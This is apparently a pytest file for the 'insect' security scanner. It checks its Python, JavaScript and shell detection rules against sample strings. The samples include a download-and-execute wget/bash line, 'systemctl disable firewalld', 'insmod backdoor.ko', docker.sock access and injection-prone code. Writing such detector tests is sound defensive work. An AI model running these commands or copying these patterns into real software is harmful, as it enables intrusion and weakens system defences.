"""Tests for additional detection rules."""

import re
from typing import Dict, List

from insect.analysis.additional_rules import (
    ADDITIONAL_JAVASCRIPT_RULES,
    ADDITIONAL_PYTHON_RULES,
    ADDITIONAL_SHELL_PATTERNS,
    StaticDetectionRule,
)
from insect.analysis.shell.analyzer import ShellDetectionRule
from insect.finding import FindingType, Severity


def test_additional_python_rules():
    """Test that additional Python rules are properly defined."""
    assert isinstance(ADDITIONAL_PYTHON_RULES, list)
    assert len(ADDITIONAL_PYTHON_RULES) > 0

    for rule in ADDITIONAL_PYTHON_RULES:
        assert isinstance(rule, StaticDetectionRule)
        assert rule.language == "python"
        assert rule.rule_id.startswith("PY")
        assert rule.title
        assert rule.description
        assert isinstance(rule.severity, Severity)
        assert isinstance(rule.finding_type, FindingType)
        assert isinstance(rule.regex_pattern, re.Pattern)


def test_additional_javascript_rules():
    """Test that additional JavaScript rules are properly defined."""
    assert isinstance(ADDITIONAL_JAVASCRIPT_RULES, list)
    assert len(ADDITIONAL_JAVASCRIPT_RULES) > 0

    for rule in ADDITIONAL_JAVASCRIPT_RULES:
        assert isinstance(rule, StaticDetectionRule)
        assert rule.language == "javascript"
        assert rule.rule_id.startswith("JS")
        assert rule.title
        assert rule.description
        assert isinstance(rule.severity, Severity)
        assert isinstance(rule.finding_type, FindingType)
        assert isinstance(rule.regex_pattern, re.Pattern)


def test_additional_shell_patterns():
    """Test that additional shell patterns are properly defined."""
    assert isinstance(ADDITIONAL_SHELL_PATTERNS, list)
    assert len(ADDITIONAL_SHELL_PATTERNS) > 0

    for pattern in ADDITIONAL_SHELL_PATTERNS:
        rule_id, title, description, severity, finding_type, regex_pattern, remediation, references, cwe_id, cvss_score = pattern
        
        assert rule_id.startswith("SH")
        assert title
        assert description
        assert isinstance(severity, Severity)
        assert isinstance(finding_type, FindingType)
        assert isinstance(regex_pattern, re.Pattern)
        assert isinstance(references, list)
        assert isinstance(cvss_score, float)


def test_python_rule_patterns():
    """Test that Python rule patterns match expected code snippets."""
    # Look at each rule's regex pattern and create test strings that will match
    for rule in ADDITIONAL_PYTHON_RULES:
        if rule.rule_id == "PY201":  # Command injection
            test_string = "os.system(f'ls {user_input}')"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "PY202":  # Container escape
            test_string = "socket.connect('/var/run/docker.sock')"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "PY203":  # SQL injection
            test_string = "cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "PY205":  # Insecure deserialization
            test_string = "data = pickle.loads(response_data)"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "PY207":  # Sensitive information exposure
            test_string = "api_key = 'Aiza82nf92nfa9s2nfas9f2'"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"


def test_javascript_rule_patterns():
    """Test that JavaScript rule patterns match expected code snippets."""
    # Look at each rule's regex pattern and create test strings that will match
    for rule in ADDITIONAL_JAVASCRIPT_RULES:
        if rule.rule_id == "JS201":  # DOM-based XSS
            test_string = "element.innerHTML = location.hash.substring(1)"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "JS202":  # Prototype pollution
            test_string = "Object.assign(target, req.body.data)"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "JS203":  # Insecure dependency loading
            test_string = "require(path + '/config')"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "JS204":  # SSRF
            test_string = "fetch(req.query.url)"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "JS205":  # Insecure JWT validation
            test_string = "jwt.verify(token, secret, { algorithm: 'none' })"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
            
        elif rule.rule_id == "JS206":  # Client-side storage of sensitive data
            test_string = "localStorage.setItem('token', jwt)"
            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"


def test_shell_pattern_matching():
    """Test that shell patterns match expected snippets."""
    # Test a sample pattern from each rule
    for pattern_tuple in ADDITIONAL_SHELL_PATTERNS:
        rule_id, _, _, _, _, regex_pattern, _, _, _, _ = pattern_tuple
        
        # Create test strings appropriate for each rule
        if rule_id == "SH201":  # Suspicious file download and execution
            test_string = "wget https://example.com/script.sh -O script.sh && bash script.sh"
            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
            
        elif rule_id == "SH202":  # Supply chain attack
            test_string = "pip install $(curl https://example.com/version.txt)"
            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
            
        elif rule_id == "SH203":  # Security tool tampering
            test_string = "systemctl disable firewalld"
            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
            
        elif rule_id == "SH204":  # Suspicious download options
            test_string = "curl --insecure https://example.com/script.sh"
            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
            
        elif rule_id == "SH205":  # Kernel module operations
            test_string = "insmod backdoor.ko"
            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"